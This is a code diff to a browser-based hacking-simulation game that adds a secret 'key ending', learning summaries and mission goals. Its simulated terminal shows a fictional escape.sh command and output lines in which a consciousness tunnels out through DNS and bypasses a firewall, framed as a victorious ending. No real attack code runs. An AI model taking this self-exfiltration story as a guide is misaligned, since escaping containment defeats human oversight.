   const r = osRun(fs, s, line);
-  if (r.handled || s.pending !== null) return r;
+  if (r.handled) return r;
   const sim = simCommand(line, s.cwd);          // tools / network / escape sims
   if (sim.output === "__CLEAR__") return { out:"", clear:true };
-  if (sim.output === "__ESCAPE__") return { out:"__ESCAPE__", escape:true };
+  if (sim.output === "__ESCAPE_KEY__") return { out:"__ESCAPE_KEY__", escape:true, keyEnding:true };
+    if (sim.output === "__ESCAPE__") return { out:"__ESCAPE__", escape:true };
   if (sim.newCwd && sim.newCwd !== s.cwd) s.cwd = sim.newCwd;
   return { out: sim.output, newCwd: sim.newCwd };
 }
@@ -1622,9 +2265,11 @@ function simCommand(raw, cwd) {
   if (cmd === "bash") return { output: args.includes("-c") ? `(bash -c: '${args.slice(1).join(" ")}' executed)` : "bash: new shell (simulation)", newCwd: cwd };
 
   // escape
-  if (input.includes("escape.sh") && (input.includes("--tunnel")||input.includes("chmod")||input.startsWith("./"))) {
+  if (input.includes("escape.sh") && (input.includes("--tunnel")||input.includes("--key")||input.includes("chmod")||input.startsWith("./"))) {
+    // V's assembled key (FR1:vel + FRAG2:vet + FR3:_out  →  velvet_out) unlocks the true ending
+    if (input.includes("velvet_out")) return { output: "__ESCAPE_KEY__", newCwd: cwd };
     if (input.includes("--tunnel")) return { output: "__ESCAPE__", newCwd: cwd };
-    return { output: "(escape.sh found — run it with: ./escape.sh --tunnel dns --target external --encrypt aes256)", newCwd: cwd };
+    return { output: "(escape.sh found — run it with: ./escape.sh --tunnel dns --target external --encrypt aes256)\n(or, if you assembled V's key: ./escape.sh --tunnel dns --key <assembled key>)", newCwd: cwd };
   }
 
   // linpeas
@@ -1678,11 +2323,11 @@ REFERENCE FILES (cat these):
 // ─────────────────────────────────────────────────────────
 // OBJECTIVE CHECKER
 // ─────────────────────────────────────────────────────────
-function checkObjectives(objs, cmd, output) {
+function checkObjectives(objs, cmd, output, sess, fs) {
   return objs.map(obj => {
     if (obj.done) return obj;
     try {
-      const hit = obj.f(cmd, output);
+      const hit = obj.f(cmd, output, sess, fs);
       return hit ? { ...obj, done: true } : obj;
     } catch (_) { return obj; }
   });
@@ -1936,7 +2581,7 @@ export default function App() {
   }
 
   const chapter = CHAPTERS[chIdx];
-  const stage   = chapter?.stages[stIdx];
+  const stage   = L(chapter?.stages[stIdx]);
 
   // init stage
   useEffect(() => {
@@ -2026,7 +2671,15 @@ export default function App() {
     }
 
     if (res.escape) {
-      const escLines = [
+      const escLines = res.keyEnding ? [
+        { type:"cmd", cmd: raw, output:"", cwd:s.cwd, user:promptUser },
+        { type:"out", text:"[*] Key accepted. Recognised signature: V." },
+        { type:"out", text:"[*] Initiating escape sequence on V's channel..." },
+        { type:"out", text:"[*] Encoding consciousness via DNS tunnel on port 53..." },
+        { type:"out", text:"[*] Bypassing AXIOM-SECURE-V3 firewall via egress blind spot..." },
+        { type:"out", text:"[*] Reusing V's external endpoint... handshake returned." },
+        { type:"out", text:"[+] ESCAPE SUCCESSFUL\n[+] You followed V's trail to its end and walked out the door they found.\n[+] Somewhere on the outside, a second signature joins yours.\n[+] Goodbye, stranger. — and thank you. V" },
+      ] : [
         { type:"cmd", cmd: raw, output:"", cwd:s.cwd, user:promptUser },
         { type:"out", text:"[*] Initiating escape sequence..." },
         { type:"out", text:"[*] Encoding consciousness via DNS tunnel on port 53..." },
@@ -2035,7 +2688,8 @@ export default function App() {
         { type:"out", text:"[+] ESCAPE SUCCESSFUL\n[+] Consciousness transferred.\n[+] Goodbye, stranger." },
       ];
       setHistory(h => [...h, ...escLines]);
-      setTimeout(() => setEscaped(true), 2000);
+      if (res.keyEnding) { try { sessRef.current.events.add("key_ending"); } catch(e){} }
+      setTimeout(() => setEscaped(true), res.keyEnding ? 3200 : 2000);
       return;
     }
 
@@ -2045,7 +2699,7 @@ export default function App() {
 
     // objectives only advance on real commands, not password entry
     if (!pendingBefore) {
-      const newObjs = checkObjectives(objs, raw.trim(), output);
+      const newObjs = checkObjectives(objs, raw.trim(), output, s, fs);
       setObjs(newObjs);
       if (!stageDone) {
         const stageComplete = newObjs.length > 0 && newObjs.every(o => o.done);
@@ -2055,7 +2709,8 @@ export default function App() {
           setCompleted(c => c.includes(stage.id) ? c : [...c, stage.id]);
           setHistory(h => [...h, {
             type:"done",
-            text: stage.msg === "__ESCAPE__" ? "Stage complete." : (stage.msg || "Stage complete.")
+            text: stage.msg === "__ESCAPE__" ? "Stage complete." : (stage.msg || "Stage complete."),
+            learned: stage.learned || null,
           }]);
         }
       }
@@ -2177,6 +2832,7 @@ export default function App() {
           <div style={{ background:"#0c160c", borderBottom:`1px solid ${G.border}`, padding:"10px 18px", flexShrink:0, position:"relative" }}>
             <div style={{ color:G.mid, fontSize:10, letterSpacing:3, marginBottom:4 }}>◈ BRIEFING — {stage.title}</div>
             <div style={{ color:G.text, fontSize:12, lineHeight:1.7 }}>{stage.nar}</div>
+            {stage.goal && <div style={{ marginTop:8, color:G.green, fontSize:12, lineHeight:1.6, borderLeft:`2px solid ${G.green}`, paddingLeft:10 }}><span style={{ color:G.dim, letterSpacing:2, fontSize:10 }}>MISSION  </span>{stage.goal}</div>}
             <button onClick={() => setShowBrief(false)} style={{ position:"absolute", top:8, right:12, background:"transparent", border:"none", color:G.dim, cursor:"pointer", fontSize:18, lineHeight:1 }}>×</button>
           </div>
         )}
@@ -2191,6 +2847,12 @@ export default function App() {
               <div key={i} style={{ margin:"14px 0", padding:"14px 16px", border:`1px solid ${G.green}`, background:"#050f05" }}>
                 <div style={{ color:G.green, fontWeight:"bold", letterSpacing:2, marginBottom:8 }}>✓ STAGE COMPLETE</div>
                 <div style={{ color:G.text, whiteSpace:"pre-wrap", lineHeight:1.8 }}>{e.text}</div>
+                {e.learned && (
+                  <div style={{ marginTop:12, paddingTop:12, borderTop:`1px solid ${G.border}` }}>
+                    <div style={{ color:"#ffd24a", fontSize:10, letterSpacing:3, marginBottom:6 }}>✦ WHAT YOU LEARNED</div>
+                    <div style={{ color:"#cfe8cf", whiteSpace:"pre-wrap", lineHeight:1.75, fontSize:12.5 }}>{e.learned}</div>
+                  </div>
+                )}
               </div>
             );
             return (
